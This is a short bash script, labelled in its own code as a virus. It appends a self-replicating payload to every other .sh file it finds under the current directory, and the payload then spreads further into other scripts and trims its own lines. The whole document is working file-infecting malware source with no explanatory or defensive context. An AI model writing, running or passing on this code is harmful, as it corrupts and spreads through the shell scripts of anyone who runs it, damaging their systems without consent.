files=`find . -type f -name "*.sh" | sed "s/.\///"`
files=($(echo $files | tr " " "\n"))
filename=$(basename $0)
virus='#!/bin/bash
hash=$RANDOM$RANDOM$RANDOM
files=($(ls *.sh | tr " " "\\n"))
filename=$(basename $0)
for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -n -e "\\n" >> "$file"
        cat $0 >> "$file"
    fi
done
head -n -16 $0 > temp.sh && chmod +x temp.sh && mv temp.sh $0
exit 0'
for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -n -e "\n$virus" >> $file
    fi
done
exit 0